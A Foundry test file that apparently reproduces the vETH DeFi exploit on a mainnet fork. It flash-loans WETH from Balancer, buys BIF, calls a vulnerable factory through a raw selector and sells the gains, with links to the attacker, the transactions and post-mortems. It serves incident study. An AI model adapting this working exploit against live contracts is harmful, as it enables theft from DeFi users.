// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 447k
// Attacker : https://etherscan.io/address/0x351d38733de3f1e73468d24401c59f63677000c9
// Attack Contract : https://etherscan.io/address/0x713d2b652e5f2a86233c57af5341db42a5559dd1
// Vulnerable Contract : https://etherscan.io/address/0x280a8955a11fcd81d72ba1f99d265a48ce39ac2e
// Attack Tx : https://etherscan.io/tx/0x900891b4540cac8443d6802a08a7a0562b5320444aa6d8eed19705ea6fb9710b (vETH-BIF)
// Attack Tx : https://etherscan.io/tx/0x1ae40f26819da4f10bc7c894a2cc507cdb31c29635d31fa90c8f3f240f0327c0 (vETH-Cowbo)
// Attack Tx : https://etherscan.io/tx/0x90db330d9e46609c9d3712b60e64e32e3a4a2f31075674a58dd81181122352f8 (vETH-BOVIN)

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x280a8955a11fcd81d72ba1f99d265a48ce39ac2e#code

// @Analysis
// Post-mortem : https://blog.verichains.io/p/veth-incident-with-unknown-mechanism
// Twitter Guy : https://x.com/TenArmorAlert/status/1856984299905716645
// Hacking God : https://www.quillaudits.com/blog/hack-analysis/veth-token-450k-exploit-analysis

contract vETH_exp is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 21_184_778 - 1;
    IBalancerVault constant vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniswapV2Pair constant pair = IUniswapV2Pair(0x0634866dfd8F05019c2A6e1773dC64Cb5a5D3E6c);
    IWETH constant WETH_TOKEN = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 constant BIF = IERC20(0xAefEF41f5a0Bb29FE3d1330607B48FBbA55904CE);
    IERC20 constant vETH = IERC20(0x280A8955A11FcD81D72bA1F99d265A48ce39aC2E);
    address constant VULN_FACTORY = address(0x62f250CF7021e1CF76C765deC8EC623FE173a1b5);
    address constant DEX_INTERFACE = address(0x19C5538DF65075d53D6299904636baE68b6dF441);
    uint256 borrowed_eth = 0;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        vm.label(address(vault), "Balancer: Vault");
        vm.label(address(WETH_TOKEN), "Wrapped Ether");
        vm.label(address(BIF), "BIF");
        vm.label(address(vETH), "vETH");
        vm.label(address(pair), "Uniswap V2: vETH-BIF");
        vm.label(address(VULN_FACTORY), "Vulnerable Factory");
        vm.label(address(DEX_INTERFACE), "Dex Interface");
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(0);
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        borrowed_eth = WETH_TOKEN.balanceOf(address(vault));

        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH_TOKEN);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = borrowed_eth;
        vault.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        console2.log("Borrowed WETH: %18e ether", borrowed_eth); // 32560.203560896180352774 ether
        WETH_TOKEN.withdraw(borrowed_eth);
        // buy BIF
        DEX_INTERFACE.call{value: borrowed_eth}(
            abi.encodeWithSignature("buyQuote(address,uint256,uint256)", address(BIF), borrowed_eth, 0));
        uint256 bif_balance = BIF.balanceOf(address(this));
        console2.log("BIF balance before exploit: ", bif_balance);

        // exploit vulnerability in factory
        BIF.approve(VULN_FACTORY, bif_balance);
        VULN_FACTORY.call(
            abi.encodeWithSelector(0x6c0472da, address(vETH), address(BIF), 300 ether, 0, 0, 0)
        );

        bif_balance = BIF.balanceOf(address(this));
        console2.log("BIF balance after exploit : ", bif_balance);

        // sell BIF
        BIF.approve(DEX_INTERFACE, bif_balance);
        DEX_INTERFACE.call(
            abi.encodeWithSignature("sellQuote(address,uint256,uint256)", address(BIF), 6378941079150051291618297, 0));

        // repay flashloan
        WETH_TOKEN.deposit{value: borrowed_eth}();
        WETH_TOKEN.transfer(address(vault), borrowed_eth);
    }

    fallback() external payable {
    }
}
